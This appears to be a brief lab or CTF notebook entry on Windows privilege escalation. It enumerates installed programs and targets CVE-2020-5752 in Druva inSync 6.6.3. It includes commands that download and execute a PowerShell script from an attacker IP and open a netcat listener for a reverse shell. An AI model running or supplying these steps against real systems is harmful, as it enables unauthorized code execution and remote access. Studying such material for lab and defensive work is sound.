- [ ] Enumeration Of Installed Applications
- [ ] Search For Exploitation
- [ ] CVE-2020-5752 | Druva inSync 6.6.3

Enumeration Of Installed Applications!!!
```powershell
# Programs Folders
dir C:\Program Files (x86)
dir C:\Program Files 
# Enumerating Installed Programs
cmd /c wmic product get name
wmic product get name
```
Search For Exploitation!!!
```
Google is your friend ...
```
CVE-2020-5752 | Druva inSync 6.6.3!!!
```powershell
wget "http://10.10.14.96/E.ps1" -outfile E.ps1
.\E.ps1
nc -lvnp 443
```
![[Pasted image 20251108212352.png]]